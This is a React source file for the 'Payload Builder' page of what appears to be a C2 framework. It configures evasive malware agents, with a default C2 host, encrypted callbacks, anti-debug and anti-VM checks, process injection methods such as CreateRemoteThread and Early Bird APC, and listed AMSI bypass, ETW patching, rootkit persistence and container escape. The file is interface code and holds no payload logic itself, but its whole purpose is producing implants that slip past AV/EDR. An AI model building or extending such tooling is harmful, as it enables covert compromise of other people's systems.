import * as React from "react"
import { useState } from "react"
import { motion } from "framer-motion"
import { GradientText } from '@/components/ui/GradientText'
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/Card'
import { Button } from '@/components/ui/Button'
import { Input } from '@/components/ui/Input'
import { Textarea } from '@/components/ui/Textarea'
import { Label } from '@/components/ui/Label'
import { Switch } from '@/components/ui/Switch'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/Select'
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/Tabs'
import { cn } from '@/lib/utils'
import { api } from '@/services/api'
import type { PayloadConfig, BuildResult } from '@/types'
import {
  Box,
  Download,
  Loader2,
  CheckCircle,
  AlertCircle,
  Shield,
  Bug,
  Cpu,
  Globe,
  Lock,
  Eye,
  EyeOff,
  Zap,
  Settings,
  Terminal,
  FileCode,
  Copy,
  Trash2,
  Save,
  Plus,
  Minus,
  ChevronDown,
  ChevronUp,
  RefreshCw,
} from "lucide-react"
import { toast } from 'sonner'

const defaultConfig: PayloadConfig = {
  ServerHost: 'chemical-umbra.vercel.app',
  ServerPort: 443,
  UseTLS: true,
  Platform: 'windows',
  Arch: 'x64',
  Obfuscation: true,
  AntiDebug: true,
  AntiVM: true,
  SleepObfuscation: true,
  EncryptedComms: true,
  ProcessInjection: false,
  InjectionMethod: 'none',
  EncryptionKey: '',
  CustomConfig: '',
}

export function PayloadBuilderPage() {
  const [config, setConfig] = useState<PayloadConfig>(defaultConfig)
  const [building, setBuilding] = useState(false)
  const [result, setResult] = useState<BuildResult | null>(null)
  const [activeTab, setActiveTab] = useState<'basic' | 'evasion' | 'advanced'>('basic')
  const [showKey, setShowKey] = useState(false)
  const [customConfigLines, setCustomConfigLines] = useState<string[]>([''])
  const [agentFile, setAgentFile] = useState<File | null>(null)
  const [agentFileLabel, setAgentFileLabel] = useState('')

  const handleBuild = async () => {
    if (!agentFile) {
      toast.error('Build failed', {
        description: 'Upload a compiled agent in Advanced, then Build. Vercel has no stored binary.',
      })
      return
    }
    setBuilding(true)
    setResult(null)
    try {
      const buildResult = await api.buildPayload(config, agentFile)
      setResult(buildResult)
      if (buildResult.Success) {
        if (buildResult.DownloadB64) {
          const bin = Uint8Array.from(atob(buildResult.DownloadB64), c => c.charCodeAt(0))
          const blob = new Blob([bin], { type: 'application/octet-stream' })
          const url = URL.createObjectURL(blob)
          const a = document.createElement('a')
          a.href = url
          a.download = buildResult.BinaryName || 'umbra-windows.exe'
          document.body.appendChild(a)
          a.click()
          a.remove()
          URL.revokeObjectURL(url)
        }
        toast.success('Payload built successfully!', {
          description: `Binary: ${buildResult.BinaryName} (${(buildResult.Size / 1024).toFixed(1)} KB)`,
        })
      } else {
        toast.error('Build failed', {
          description: buildResult.Error,
        })
      }
    } catch (error) {
      toast.error('Build failed', {
        description: error instanceof Error ? error.message : 'Unknown error',
      })
    } finally {
      setBuilding(false)
    }
  }

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, platform: 'windows' | 'linux') => {
    const file = e.target.files?.[0]
    if (!file) return
    setAgentFile(file)
    setAgentFileLabel(`${platform}: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`)
    try {
      await api.uploadAgentBinary(file, platform)
      toast.success(`${platform} agent kept for this Build`)
    } catch {
      toast.success(`${platform} agent kept locally — will send with Build`)
    }
  }

  const randomKey = () =>
    Array.from(crypto.getRandomValues(new Uint8Array(32)))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('')

  const generateEncryptionKey = () => {
    const key = randomKey()
    setConfig(prev => ({ ...prev, EncryptedComms: true, EncryptionKey: key }))
    toast.success('Encryption key generated')
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast.success('Copied to clipboard')
  }

  const platformOptions = [
    { value: 'windows', label: 'Windows', icon: <Globe className="w-4 h-4" /> },
    { value: 'linux', label: 'Linux', icon: <Terminal className="w-4 h-4" /> },
  ]

  const archOptions = [
    { value: 'x64', label: 'x64 (64-bit)' },
    { value: 'x86', label: 'x86 (32-bit)' },
    { value: 'arm64', label: 'ARM64' },
  ]

  return (
    <div className="space-y-6 animate-fade-in max-w-6xl mx-auto">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4 }}
        className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4"
      >
        <div>
          <GradientText className="text-3xl font-bold" colors={['#fff', '#d946ef', '#a855f7']}>
            Payload Builder
          </GradientText>
          <p className="text-dark-400 mt-1">Create customized agent payloads with evasion techniques</p>
        </div>
      </motion.div>

      {/* Tabs */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: 0.1 }}
      >
        <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as 'basic' | 'evasion' | 'advanced')} className="w-full">
          <TabsList className="grid w-full grid-cols-3 bg-dark-800/50 p-1 rounded-lg border border-dark-700">
            <TabsTrigger value="basic" className="gap-2">
              <Box className="w-4 h-4" />
              <span>Basic Config</span>
            </TabsTrigger>
            <TabsTrigger value="evasion" className="gap-2">
              <Shield className="w-4 h-4" />
              <span>Evasion</span>
            </TabsTrigger>
            <TabsTrigger value="advanced" className="gap-2">
              <Settings className="w-4 h-4" />
              <span>Advanced</span>
            </TabsTrigger>
          </TabsList>

          {/* Basic Config Tab */}
          <TabsContent value="basic" className="space-y-6 mt-4">
            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Globe className="w-5 h-5 text-accent-400" />
                  Server Configuration
                </CardTitle>
                <CardDescription>C2 server connection settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="serverHost">Server Host</Label>
                    <Input
                      id="serverHost"
                      value={config.ServerHost}
                      onChange={(e) => setConfig(prev => ({ ...prev, ServerHost: e.target.value }))}
                      placeholder="c2.example.com or IP"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="serverPort">Server Port</Label>
                    <Input
                      id="serverPort"
                      type="number"
                      value={config.ServerPort}
                      onChange={(e) => {
                        const port = parseInt(e.target.value) || 0
                        setConfig(prev => ({
                          ...prev,
                          ServerPort: port || 443,
                          UseTLS: port === 443 ? true : prev.UseTLS,
                        }))
                      }}
                      placeholder="443"
                    />
                  </div>
                </div>
                <div className="flex items-center justify-between rounded-lg border border-dark-700 bg-dark-900 px-3 py-2">
                  <div>
                    <Label htmlFor="useTls">Use TLS</Label>
                    <p className="text-xs text-dark-500">WINHTTP_FLAG_SECURE on the agent. Required for Vercel :443.</p>
                  </div>
                  <Switch
                    id="useTls"
                    checked={config.UseTLS || config.ServerPort === 443}
                    onCheckedChange={(v) => setConfig(prev => ({ ...prev, UseTLS: v }))}
                  />
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label>Target Platform</Label>
                    <Select value={config.Platform} onValueChange={(v) => setConfig(prev => ({ ...prev, Platform: v as 'windows' | 'linux' }))}>
                      <SelectTrigger>
                        <SelectValue placeholder="Select platform" />
                      </SelectTrigger>
                      <SelectContent>
                        {platformOptions.map(opt => (
                          <SelectItem key={opt.value} value={opt.value}>
                            <div className="flex items-center gap-2">
                              {opt.icon}
                              <span>{opt.label}</span>
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="space-y-2">
                    <Label>Architecture</Label>
                    <Select value={config.Arch} onValueChange={(v) => setConfig(prev => ({ ...prev, Arch: v as 'x64' | 'x86' | 'arm64' }))}>
                      <SelectTrigger>
                        <SelectValue placeholder="Select architecture" />
                      </SelectTrigger>
                      <SelectContent>
                        {archOptions.map(opt => (
                          <SelectItem key={opt.value} value={opt.value}>{opt.label}</SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Lock className="w-5 h-5 text-accent-400" />
                  Encryption
                </CardTitle>
                <CardDescription>AES-256 encryption key for C2 communications</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="encryptionKey">Encryption Key (64 hex chars)</Label>
                  <div className="flex items-center gap-2">
                    <Input
                      id="encryptionKey"
                      type={showKey ? 'text' : 'password'}
                      value={config.EncryptionKey}
                      onChange={(e) => setConfig(prev => ({ ...prev, EncryptionKey: e.target.value }))}
                      placeholder="Auto-generated if empty"
                      className="flex-1 font-mono"
                    />
                    <Button variant="outline" size="icon" onClick={() => setShowKey(!showKey)}>
                      {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                    <Button variant="outline" size="icon" onClick={generateEncryptionKey}>
                      <Zap className="w-4 h-4" />
                    </Button>
                    <Button variant="outline" size="icon" onClick={() => copyToClipboard(config.EncryptionKey)} disabled={!config.EncryptionKey}>
                      <Copy className="w-4 h-4" />
                    </Button>
                  </div>
                  <p className="text-xs text-dark-500">Leave empty to auto-generate. Key must be 64 hex characters (32 bytes).</p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Evasion Tab */}
          <TabsContent value="evasion" className="space-y-6 mt-4">
            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-accent-400" />
                  Anti-Analysis Techniques
                </CardTitle>
                <CardDescription>Enable evasion techniques to bypass AV/EDR detection</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Bug className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Anti-Debugging</p>
                          <p className="text-sm text-dark-500">Detects debugger attachment</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.AntiDebug}
                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, AntiDebug: checked }))}
                      />
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Cpu className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Anti-VM</p>
                          <p className="text-sm text-dark-500">Detects virtual machine environments</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.AntiVM}
                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, AntiVM: checked }))}
                      />
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Zap className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Sleep Obfuscation</p>
                          <p className="text-sm text-dark-500">Encrypts memory during sleep</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.SleepObfuscation}
                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, SleepObfuscation: checked }))}
                      />
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <FileCode className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Code Obfuscation</p>
                          <p className="text-sm text-dark-500">Obfuscates strings and control flow</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.Obfuscation}
                        onCheckedChange={(checked) => setConfig(prev => ({ ...prev, Obfuscation: checked }))}
                      />
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Lock className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Encrypted Communications</p>
                          <p className="text-sm text-dark-500">AES-256 encrypted C2 traffic</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.EncryptedComms}
                        onCheckedChange={(checked) => {
                          setConfig(prev => ({
                            ...prev,
                            EncryptedComms: checked,
                            EncryptionKey: checked ? (prev.EncryptionKey || randomKey()) : prev.EncryptionKey,
                          }))
                        }}
                      />
                    </div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Settings className="w-5 h-5 text-accent-400" />
                        <div>
                          <p className="font-medium text-dark-100">Process Injection</p>
                          <p className="text-sm text-dark-500">Inject into legitimate processes</p>
                        </div>
                      </div>
                      <Switch
                        checked={config.ProcessInjection}
                        onCheckedChange={(checked) => {
                          setConfig(prev => ({
                            ...prev,
                            ProcessInjection: checked,
                            InjectionMethod: checked ? (prev.InjectionMethod === 'none' ? 'crt' : prev.InjectionMethod) : 'none',
                          }))
                        }}
                      />
                    </div>
                    {config.ProcessInjection && (
                      <div className="pl-8 space-y-2">
                        <Label>Injection Method</Label>
                        <Select
                          value={config.InjectionMethod || 'crt'}
                          onValueChange={(v) => setConfig(prev => ({ ...prev, InjectionMethod: v, ProcessInjection: v !== 'none' }))}
                        >
                          <SelectTrigger>
                            <SelectValue placeholder="Select method" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="crt">CreateRemoteThread</SelectItem>
                            <SelectItem value="apc">QueueUserAPC</SelectItem>
                            <SelectItem value="earlybird">Early Bird APC</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-accent-400" />
                  Windows-Specific Evasion
                </CardTitle>
                <CardDescription>Additional evasion techniques for Windows targets</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">AMSI Bypass</p>
                    <p className="text-sm text-dark-500">Bypass Antimalware Scan Interface</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">ETW Patching</p>
                    <p className="text-sm text-dark-500">Disable Event Tracing for Windows</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">PPID Spoofing</p>
                    <p className="text-sm text-dark-500">Spoof parent process ID</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">DLL Unhooking</p>
                    <p className="text-sm text-dark-500">Restore original syscalls</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Heap Encryption</p>
                    <p className="text-sm text-dark-500">Encrypt heap allocations</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Stack Spoofing</p>
                    <p className="text-sm text-dark-500">Fake stack frames</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-accent-400" />
                  Linux-Specific Evasion
                </CardTitle>
                <CardDescription>Additional evasion techniques for Linux targets</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">LD_PRELOAD Injection</p>
                    <p className="text-sm text-dark-500">Preload malicious shared library</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Ptrace Evasion</p>
                    <p className="text-sm text-dark-500">Anti-debugging via ptrace</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Seccomp Bypass</p>
                    <p className="text-sm text-dark-500">Bypass syscall filtering</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Namespace Escape</p>
                    <p className="text-sm text-dark-500">Container breakout techniques</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">EBPF Hiding</p>
                    <p className="text-sm text-dark-500">Hide from eBPF monitors</p>
                  </div>
                  <div className="space-y-2 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <p className="font-medium text-dark-100">Rootkit Persistence</p>
                    <p className="text-sm text-dark-500">Kernel-level persistence</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Advanced Tab */}
          <TabsContent value="advanced" className="space-y-6 mt-4">
            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FileCode className="w-5 h-5 text-accent-400" />
                  Custom Configuration
                </CardTitle>
                <CardDescription>Additional JSON configuration for advanced features</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="customConfig">Custom Config (JSON)</Label>
                  <Textarea
                    id="customConfig"
                    value={config.CustomConfig}
                    onChange={(e) => setConfig(prev => ({ ...prev, CustomConfig: e.target.value }))}
                    placeholder='{"key": "value"}'
                    className="font-mono text-sm bg-dark-950 border-dark-700"
                    rows={10}
                  />
                </div>
                <div className="flex items-center gap-2">
                  <Button variant="outline" onClick={() => {
                    setConfig(prev => ({ ...prev, CustomConfig: JSON.stringify({
                      c2_host: prev.ServerHost,
                      c2_port: String(prev.ServerPort),
                      use_tls: (prev.UseTLS || prev.ServerPort === 443) ? 'true' : 'false',
                      sleep_interval: '180',
                      jitter: '40',
                      persistence: 'false',
                      hide_console: 'true',
                    }, null, 2) }))
                  }}>
                    Load Template
                  </Button>
                  <Button variant="outline" onClick={() => setConfig(prev => ({ ...prev, CustomConfig: '' }))}>
                    Clear
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card className="card-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Download className="w-5 h-5 text-accent-400" />
                  Custom Agent Binary Upload
                </CardTitle>
                <CardDescription>Upload your own compiled agent binaries</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <p className="font-medium text-dark-100">Windows Agent (.exe)</p>
                    <Input
                      type="file"
                      accept=".exe"
                      onChange={(e) => handleFileUpload(e, 'windows')}
                      className="bg-dark-900 border-dark-700"
                    />
                    <p className="text-xs text-dark-500">
                      {agentFileLabel || 'Upload a compiled Windows x64 agent. Required for Build on Vercel.'}
                    </p>
                  </div>
                  <div className="space-y-4">
                    <p className="font-medium text-dark-100">Linux Agent (ELF)</p>
                    <Input
                      type="file"
                      accept=""
                      onChange={(e) => handleFileUpload(e, 'linux')}
                      className="bg-dark-900 border-dark-700"
                    />
                    <p className="text-xs text-dark-500">Upload a custom Linux x86_64 agent binary</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </motion.div>

      {/* Build Section */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.4, delay: 0.2 }}
      >
        <Card className="card-hover border-accent-500/20">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Zap className="w-5 h-5 text-accent-400" />
              Build Payload
            </CardTitle>
            <CardDescription>Compile the agent with your configuration</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex flex-col sm:flex-row gap-4">
              <Button 
                size="lg" 
                onClick={handleBuild} 
                disabled={building}
                className="flex-1 sm:flex-none"
              >
                {building ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin mr-2" />
                    Building...
                  </>
                ) : (
                  <>
                    <Zap className="w-5 h-5 mr-2" />
                    Build Payload
                  </>
                )}
              </Button>
              <Button variant="outline" size="lg" onClick={() => setConfig(defaultConfig)} disabled={building}>
                <RefreshCw className="w-5 h-5 mr-2" />
                Reset Config
              </Button>
            </div>

            {result && (
              <div className={cn(
                "p-4 rounded-lg border font-mono text-sm",
                result.Success ? "bg-green-500/10 border-green-500/30 text-green-400" : "bg-red-500/10 border-red-500/30 text-red-400"
              )}>
                <div className="flex items-center justify-between mb-2">
                  <span className="font-medium">
                    {result.Success ? (
                      <>
                        <CheckCircle className="w-4 h-4 inline mr-2" />
                        Build Successful
                      </>
                    ) : (
                      <>
                        <AlertCircle className="w-4 h-4 inline mr-2" />
                        Build Failed
                      </>
                    )}
                  </span>
                  {result.Success && (
                    <Button variant="ghost" size="sm" onClick={() => copyToClipboard(result.BinaryPath)}>
                      <Copy className="w-4 h-4 mr-1" />
                      Copy Path
                    </Button>
                  )}
                </div>
                {result.Success && (
                  <div className="space-y-1">
                    <div className="flex justify-between">
                      <span className="text-dark-400">Binary:</span>
                      <span>{result.BinaryName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-dark-400">Size:</span>
                      <span>{(result.Size / 1024).toFixed(1)} KB</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-dark-400">Checksum:</span>
                      <span className="truncate max-w-[200px]">{result.Checksum}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-dark-400">Platform:</span>
                      <span>{config.Platform} ({config.Arch})</span>
                    </div>
                  </div>
                )}
                {!result.Success && result.Error && (
                  <p className="mt-2">{result.Error}</p>
                )}
              </div>
            )}

            {/* Quick Config Presets */}
            <div className="pt-4 border-t border-dark-700">
              <p className="text-sm text-dark-400 mb-3">Quick Presets</p>
              <div className="flex flex-wrap gap-2">
                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: true, AntiVM: true, Obfuscation: true, SleepObfuscation: true }))}>
                  <Shield className="w-3 h-3 mr-1" />
                  Windows Stealth
                </Button>
                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'linux', Arch: 'x64', AntiDebug: true, AntiVM: true, Obfuscation: true, SleepObfuscation: true }))}>
                  <Terminal className="w-3 h-3 mr-1" />
                  Linux Stealth
                </Button>
                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x64', AntiDebug: false, AntiVM: false, Obfuscation: false, SleepObfuscation: false }))}>
                  <Bug className="w-3 h-3 mr-1" />
                  Debug Build
                </Button>
                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'windows', Arch: 'x86' }))}>
                  <Cpu className="w-3 h-3 mr-1" />
                  Windows x86
                </Button>
                <Button variant="outline" size="sm" onClick={() => setConfig(prev => ({ ...prev, Platform: 'linux', Arch: 'arm64' }))}>
                  <Cpu className="w-3 h-3 mr-1" />
                  Linux ARM64
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      </motion.div>
    </div>
  )
}